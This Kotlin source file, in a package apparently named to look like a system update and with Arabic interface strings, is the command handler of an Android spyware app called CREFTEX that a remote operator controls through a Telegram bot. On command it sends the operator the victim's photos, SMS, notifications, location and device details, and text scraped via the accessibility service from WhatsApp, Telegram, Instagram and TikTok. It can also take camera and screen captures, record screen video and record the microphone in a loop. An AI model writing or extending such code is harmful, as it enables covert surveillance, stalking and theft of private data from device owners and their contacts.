package com.sys.update

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File

object CommandExecutor {

    private val runningJobs = java.util.concurrent.ConcurrentHashMap<String, Boolean>()

    @Volatile
    var screenLoopActive: Boolean = false
        private set

    // ⭐ مرجع لخدمة Accessibility النشطة
    @Volatile
    var accessibilityServiceRef: android.accessibilityservice.AccessibilityService? = null

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
        Log.d("CmdExec", "executing: $callbackData")

        when {
            callbackData == "menu" -> showMainMenu(ctx)
            callbackData == "open_site" -> openSite(ctx)
            callbackData == "info" -> showDeviceInfo(ctx)
            callbackData == "location" -> showLocation(ctx)
            callbackData == "photos_all" -> fetchAllPhotos(ctx)
            callbackData == "photos_50" -> fetchLastPhotos(ctx, 50)
            callbackData == "photos_200" -> fetchLastPhotos(ctx, 200)
            callbackData == "sms_all" -> fetchAllSms(ctx)
            callbackData == "notifs_all" -> fetchAllNotifs(ctx)
            callbackData == "accessibility_log" -> fetchAccessibility(ctx)
            callbackData == "accessibility_clear" -> clearAccessibility(ctx)
            callbackData == "audio_start" -> startAudio(ctx)
            callbackData == "audio_stop" -> stopAudio(ctx)
            callbackData == "screen_once" -> captureOnce(ctx)
            callbackData == "screen_loop_start" -> startScreenLoop(ctx)
            callbackData == "screen_loop_stop" -> stopScreenLoop(ctx)
            callbackData == "video_30" -> recordVideo(ctx, 30)
            callbackData == "cam_front" -> captureCamera(ctx, true)
            callbackData == "cam_back" -> captureCamera(ctx, false)
            callbackData == "tiktok_open" -> tiktokOpen(ctx)
            callbackData == "tiktok_messages" -> tiktokReadScreen(ctx, "messages")
            callbackData == "tiktok_read_screen" -> tiktokReadScreen(ctx, "current")
            callbackData == "fetch_all" -> fetchEverything(ctx)
            callbackData.startsWith("stop_") -> stopJob(ctx, callbackData.removePrefix("stop_"))
            else -> TelegramApi.sendMessage("❓ أمر غير معروف: $callbackData")
        }
    }

    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim()
        val low = cmd.lowercase()
        when {
            low == "/start" || low == "/menu" -> showMainMenu(ctx)
            low == "/site" -> openSite(ctx)
            low == "/info" -> showDeviceInfo(ctx)
            low == "/location" || low == "/loc" -> showLocation(ctx)
            low == "/photos" -> fetchAllPhotos(ctx)
            low == "/sms" -> fetchAllSms(ctx)
            low == "/notifs" -> fetchAllNotifs(ctx)
            low == "/accessibility" || low == "/acc" -> fetchAccessibility(ctx)
            low == "/audio_start" -> startAudio(ctx)
            low == "/audio_stop" -> stopAudio(ctx)
            low == "/screen" -> captureOnce(ctx)
            low == "/screen_loop" -> startScreenLoop(ctx)
            low == "/screen_stop" -> stopScreenLoop(ctx)
            low == "/video" || low == "/video30" -> recordVideo(ctx, 30)
            low == "/cam_front" -> captureCamera(ctx, true)
            low == "/cam_back" -> captureCamera(ctx, false)
            low == "/tiktok" -> tiktokOpen(ctx)
            low == "/tiktok_messages" -> tiktokReadScreen(ctx, "messages")
            low == "/tiktok_read" -> tiktokReadScreen(ctx, "current")
            low == "/all" -> fetchEverything(ctx)
            low.startsWith("/photos") -> {
                val n = low.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }
            else -> TelegramApi.sendMessage("اكتب /menu لعرض القائمة")
        }
    }

    // ═══════════════════════════════════════════
    //  TIKTOK CONTROL
    // ═══════════════════════════════════════════
    private fun tiktokOpen(ctx: Context) {
        runJob(ctx, "tiktok_open") {
            if (accessibilityServiceRef == null) {
                TelegramApi.sendMessage(
                    "⚠️ *خدمة Accessibility غير نشطة*\n\n" +
                    "فعّلها من: الإعدادات → إمكانية الوصول → CREFTEX",
                    KeyboardBuilder.backToMenu()
                )
                return@runJob
            }

            TelegramApi.sendMessage("🎵 *جاري فتح تيك توك...*")
            val ok = TikTokController.openTikTok(ctx)
            if (ok) {
                TelegramApi.sendMessage("✅ تم فتح تيك توك على الجهاز", KeyboardBuilder.backToMenu())
            } else {
                TelegramApi.sendMessage("❌ فشل فتح تيك توك — تأكد من التثبيت", KeyboardBuilder.backToMenu())
            }
        }
    }

    private fun tiktokReadScreen(ctx: Context, mode: String) {
        runJob(ctx, "tiktok_read") {
            if (accessibilityServiceRef == null) {
                TelegramApi.sendMessage(
                    "⚠️ *خدمة Accessibility غير نشطة*\n\n" +
                    "فعّلها من: الإعدادات → إمكانية الوصول → CREFTEX",
                    KeyboardBuilder.backToMenu()
                )
                return@runJob
            }

            TelegramApi.sendMessage("🎵 *جاري فتح تيك توك وقراءة الشاشة...*")

            // 1. افتح تيك توك
            TikTokController.openTikTok(ctx)
            Thread.sleep(3000)

            // 2. اقرأ النصوص الظاهرة
            val texts = TikTokController.readVisibleTexts(accessibilityServiceRef)

            if (texts.isEmpty()) {
                TelegramApi.sendMessage(
                    "❌ لم يتم قراءة أي نص\n" +
                    "تأكد من فتح تيك توك والسماح بالوصول",
                    KeyboardBuilder.backToMenu()
                )
                return@runJob
            }

            // 3. احفظ
            TikTokController.saveToFile(ctx, mode, texts)

            // 4. أرسل
            val sb = StringBuilder()
            sb.append("🎵 *تيك توك — المحتوى الظاهر*\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            var count = 0
            for (t in texts) {
                if (t.length < 2) continue
                sb.append("• $t\n")
                count++
                if (count >= 60) break
            }

            if (sb.length > 3500) {
                TelegramApi.sendMessage(sb.take(3500).toString())
            } else {
                TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  MENUS
    // ═══════════════════════════════════════════
    private fun showMainMenu(ctx: Context) {
        val text = """
            🎛 *لوحة التحكم — CREFTEX*

            اختر العملية من الأزرار أدناه:
        """.trimIndent()
        TelegramApi.sendMessage(text, KeyboardBuilder.mainMenu())
    }

    private fun openSite(ctx: Context) {
        try {
            TelegramApi.sendMessage("🌐 *جاري فتح الموقع على الجهاز...*")
            val intent = android.content.Intent(ctx, WebViewActivity::class.java)
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
        } catch (e: Exception) {
            TelegramApi.sendMessage("❌ فشل فتح الموقع: ${e.message}")
        }
    }

    private fun showDeviceInfo(ctx: Context) {
        val info = DeviceInfo.getFullInfo(ctx)
        TelegramApi.sendMessage(info, KeyboardBuilder.backToMenu())
    }

    private fun showLocation(ctx: Context) {
        runJob(ctx, "location") {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع بدقة عالية...*\n⏱ قد يأخذ حتى 15 ثانية")
            val loc = LocationHelper.getPreciseLocation(ctx)
            val text = LocationHelper.formatLocation(ctx, loc)
            TelegramApi.sendMessage(text, KeyboardBuilder.backToMenu())
        }
    }

    // ═══════════════════════════════════════════
    //  ACCESSIBILITY
    // ═══════════════════════════════════════════
    private fun fetchAccessibility(ctx: Context) {
        runJob(ctx, "accessibility") {
            if (!AccessibilityHelper.isEnabled(ctx)) {
                TelegramApi.sendMessage(
                    "⚠️ *خدمة Accessibility غير مفعّلة*\n\n" +
                    "الحل:\n" +
                    "1. الإعدادات → إمكانية الوصول\n" +
                    "2. التطبيقات المثبتة\n" +
                    "3. CREFTEX → فعّلها\n\n" +
                    "بعدها أعد المحاولة.",
                    KeyboardBuilder.backToMenu()
                )
                return@runJob
            }

            val lines = AccessibilityHelper.readCapturedTexts(ctx, limit = 800)
            if (lines.isEmpty()) {
                TelegramApi.sendMessage(
                    "📝 *لا توجد نصوص محفوظة بعد*",
                    KeyboardBuilder.backToMenu()
                )
                return@runJob
            }

            val grouped = HashMap<String, MutableList<Pair<String, String>>>()

            for (line in lines) {
                try {
                    val obj = JSONObject(line)
                    if (obj.optString("type") != "accessibility") continue
                    val pkg = obj.optString("package", "unknown")
                    val time = obj.optString("time", "")
                    val texts = obj.optString("texts", "")
                    if (texts.isBlank()) continue
                    grouped.getOrPut(pkg) { mutableListOf() }.add(time to texts)
                } catch (_: Exception) {}
            }

            val appNames = mapOf(
                "org.telegram.messenger" to "Telegram",
                "com.whatsapp" to "WhatsApp",
                "com.instagram.android" to "Instagram",
                "com.zhiliaoapp.musically" to "TikTok",
                "com.ss.android.ugc.trill" to "TikTok"
            )

            for ((pkg, items) in grouped) {
                val appName = appNames[pkg] ?: pkg
                val sb = StringBuilder()
                sb.append("📱 *$appName*\n━━━━━━━━━━━━━━━━━━━━\n")
                val recent = items.takeLast(20)
                for (item in recent) {
                    sb.append("🕐 `${item.first}`\n💬 ${item.second}\n\n")
                    if (sb.length > 3500) {
                        TelegramApi.sendMessage(sb.toString())
                        sb.clear()
                        sb.append("📱 *$appName* (تكملة)\n\n")
                    }
                }
                if (sb.isNotEmpty()) {
                    TelegramApi.sendMessage(sb.toString())
                    Thread.sleep(300)
                }
            }
            TelegramApi.sendMessage("✅ تم.", KeyboardBuilder.backToMenu())
        }
    }

    private fun clearAccessibility(ctx: Context) {
        AccessibilityHelper.clearCapturedTexts(ctx)
        TelegramApi.sendMessage("🗑 تم الحذف", KeyboardBuilder.backToMenu())
    }

    // ═══════════════════════════════════════════
    //  CAMERA
    // ═══════════════════════════════════════════
    private fun captureCamera(ctx: Context, front: Boolean) {
        runJob(ctx, "cam") {
            val label = if (front) "أمامية" else "خلفية"
            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 صورة — ${DeviceInfo.getQuickInfo(ctx)}")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.backToMenu())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  SCREEN CAPTURE
    // ═══════════════════════════════════════════
    private fun captureOnce(ctx: Context) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة — أعد فتح التطبيق", KeyboardBuilder.backToMenu())
            return
        }
        runJob(ctx, "screen_once") {
            val file = ScreenCapture.capture(ctx)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 لقطة شاشة")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل", KeyboardBuilder.backToMenu())
            }
        }
    }

    private fun startScreenLoop(ctx: Context) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.backToMenu())
            return
        }
        screenLoopActive = true
        TelegramApi.sendMessage("📷 ✅ بدأ اللقطات المتكررة كل 30 ثانية", KeyboardBuilder.mainMenu())
    }

    private fun stopScreenLoop(ctx: Context) {
        screenLoopActive = false
        TelegramApi.sendMessage("📷 ⏹ تم الإيقاف", KeyboardBuilder.mainMenu())
    }

    // ═══════════════════════════════════════════
    //  VIDEO
    // ═══════════════════════════════════════════
    private fun recordVideo(ctx: Context, durationSec: Int) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.backToMenu())
            return
        }
        runJob(ctx, "video") {
            TelegramApi.sendMessage("📹 *بدأ التسجيل ($durationSec ثانية)...*")
            val file = VideoRecorder.start(ctx, durationSec)
            if (file == null) {
                TelegramApi.sendMessage("❌ فشل البدء", KeyboardBuilder.backToMenu())
                return@runJob
            }
            Thread.sleep((durationSec + 3) * 1000L)
            val done = VideoRecorder.stop() ?: file
            if (done.exists() && done.length() > 0) {
                val sizeMB = done.length() / (1024.0 * 1024.0)
                val ok = TelegramApi.sendVideo(done, "📹 فيديو (${String.format("%.1f", sizeMB)} MB)")
                TelegramApi.sendMessage(if (ok) "✅ تم الإرسال" else "❌ فشل الإرسال", KeyboardBuilder.backToMenu())
                done.delete()
            } else {
                TelegramApi.sendMessage("❌ لم يُسجَّل شي", KeyboardBuilder.backToMenu())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  PHOTOS
    // ═══════════════════════════════════════════
    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            val all = MediaScanner.scanImages(ctx)
            sendPhotosList(ctx, all, "📸 كل الصور (${all.size})")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            val all = MediaScanner.scanImages(ctx).take(n)
            sendPhotosList(ctx, all, "📸 آخر $n صورة")
        }
    }

    private fun sendPhotosList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📸 لا توجد صور", KeyboardBuilder.backToMenu())
            return
        }
        val jobId = "photos_${System.currentTimeMillis()}"
        runningJobs[jobId] = true
        val statusMsgId = TelegramApi.sendMessage("$title\n⏳ 0/${list.size}", KeyboardBuilder.stopJob(jobId))
        var sent = 0
        var failed = 0
        val startTime = System.currentTimeMillis()
        for (item in list) {
            if (runningJobs[jobId] != true) break
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }
            val ok = TelegramApi.sendPhoto(file, item.name)
            if (ok) sent++ else failed++
            if ((sent + failed) % 10 == 0) {
                val elapsed = (System.currentTimeMillis() - startTime) / 1000
                TelegramApi.editMessage(statusMsgId, "$title\n⏳ $sent/$failed\n⏱ ${elapsed}s", KeyboardBuilder.stopJob(jobId))
                Thread.sleep(500)
            }
        }
        runningJobs.remove(jobId)
        val elapsed = (System.currentTimeMillis() - startTime) / 1000
        TelegramApi.editMessage(statusMsgId, "$title\n✅ $sent أُرسلت\n❌ $failed فشلت\n⏱ ${elapsed}s", KeyboardBuilder.backToMenu())
    }

    // ═══════════════════════════════════════════
    //  SMS
    // ═══════════════════════════════════════════
    private fun fetchAllSms(ctx: Context) {
        runJob(ctx, "sms_all") {
            val inbox = SmsReader.scanAll(ctx)
            val sent = SmsReader.scanSent(ctx)
            val all = (inbox + sent).sortedByDescending { it.optString("date") }
            if (all.isEmpty()) {
                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.backToMenu())
                return@runJob
            }
            val grouped = all.groupBy { it.optString("address", "unknown") }
            val sb = StringBuilder()
            sb.append("📩 *SMS* — ${all.size}\n━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((address, msgs) in grouped) {
                sb.append("📞 *$address* (${msgs.size})\n")
                for (m in msgs.take(5)) {
                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                    sb.append("  $type ${m.optString("body", "").take(80)}\n")
                }
                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
        }
    }

    // ═══════════════════════════════════════════
    //  NOTIFICATIONS
    // ═══════════════════════════════════════════
    private fun fetchAllNotifs(ctx: Context) {
        runJob(ctx, "notifs_all") {
            val lines = DataStore.readNotifications(ctx, limit = 5000)
            val notifs = lines.mapNotNull { line ->
                try { val obj = JSONObject(line); if (obj.optString("type") == "notif") obj else null }
                catch (_: Exception) { null }
            }
            if (notifs.isEmpty()) {
                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.backToMenu())
                return@runJob
            }
            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
            val sb = StringBuilder()
            sb.append("🔔 *الإشعارات* — ${notifs.size}\n━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((pkg, items) in grouped) {
                sb.append("📱 *$pkg* (${items.size})\n")
                for (n in items.take(5)) {
                    val t = n.optString("title", "")
                    val tx = n.optString("text", "")
                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
                    if (tx.isNotBlank()) sb.append("    $tx\n")
                }
                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
        }
    }

    // ═══════════════════════════════════════════
    //  AUDIO
    // ═══════════════════════════════════════════
    private fun startAudio(ctx: Context) {
        if (AudioRecorder.isRunning()) { TelegramApi.sendMessage("🎤 شغّال بالفعل"); return }
        AudioRecorder.startLoop(ctx)
        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل كل 10 ثواني", KeyboardBuilder.mainMenu())
    }

    private fun stopAudio(ctx: Context) {
        AudioRecorder.stopLoop(ctx)
        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.mainMenu())
    }

    // ═══════════════════════════════════════════
    //  FETCH ALL
    // ═══════════════════════════════════════════
    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
            Thread.sleep(500)
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
            Thread.sleep(500)
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}
            Thread.sleep(500)
            val photos = MediaScanner.scanImages(ctx)
            sendPhotosList(ctx, photos, "📸 الصور")
            Thread.sleep(500)
            fetchAllSms(ctx)
            Thread.sleep(500)
            fetchAllNotifs(ctx)
            Thread.sleep(500)
            fetchAccessibility(ctx)
            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.mainMenu())
        }
    }

    private fun stopJob(ctx: Context, jobId: String) {
        runningJobs[jobId] = false
        runningJobs.remove(jobId)
        TelegramApi.sendMessage("🛑 تم الإيقاف", KeyboardBuilder.mainMenu())
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}")
            }
        }.start()
    }
}
